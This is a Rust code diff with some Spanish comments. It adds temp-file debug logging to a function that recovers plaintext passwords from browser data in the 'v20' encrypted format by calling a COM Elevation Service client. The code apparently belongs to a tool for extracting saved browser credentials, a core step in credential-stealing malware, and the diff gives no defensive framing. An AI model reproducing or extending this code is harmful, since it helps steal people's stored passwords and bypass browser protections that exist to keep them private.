@@ -178,26 +178,53 @@ impl Drop for ElevationServiceClient {
 
 /// Intenta desencriptar usando Elevation Service (fallback si otros métodos fallan)
 pub fn try_decrypt_with_elevation_service(encrypted_data: &[u8]) -> Option<String> {
-    // Solo intentar si es formato v20
+    use std::fs::OpenOptions;
+    use std::io::Write;
+    let temp_dir = std::env::temp_dir();
+    let debug_path = temp_dir.join("elevation_service_debug.txt");
+    let mut debug = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(debug_path)
+        .unwrap();
+
+    writeln!(debug, "[ElevationService] Called with {} bytes", encrypted_data.len()).ok();
     if encrypted_data.len() < 3 || &encrypted_data[0..3] != b"v20" {
+        writeln!(debug, "[ElevationService] Not v20 format").ok();
         return None;
     }
 
-    // Wrap everything in catch_unwind to prevent crashes
-    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+        writeln!(debug, "[ElevationService] Initializing COM client...").ok();
         match ElevationServiceClient::new() {
             Ok(client) => {
-                // Extraer solo los datos encriptados (sin el prefijo v20)
+                writeln!(debug, "[ElevationService] COM client OK").ok();
                 let encrypted_payload = &encrypted_data[3..];
-                
+                writeln!(debug, "[ElevationService] Decrypting payload ({} bytes)...", encrypted_payload.len()).ok();
                 match client.decrypt_password(encrypted_payload) {
-                    Ok(password) => Some(password),
-                    Err(_) => None,
+                    Ok(password) => {
+                        writeln!(debug, "[ElevationService] Decrypt SUCCESS").ok();
+                        Some(password)
+                    },
+                    Err(e) => {
+                        writeln!(debug, "[ElevationService] Decrypt ERROR: {}", e).ok();
+                        None
+                    },
                 }
             },
-            Err(_) => None,
+            Err(e) => {
+                writeln!(debug, "[ElevationService] COM client ERROR: {}", e).ok();
+                None
+            },
         }
-    })).unwrap_or(None)
+    }));
+    match result {
+        Ok(val) => val,
+        Err(_) => {
+            writeln!(debug, "[ElevationService] PANIC atrapado en catch_unwind").ok();
+            None
+        }
+    }
 }
 
 #[cfg(test)]
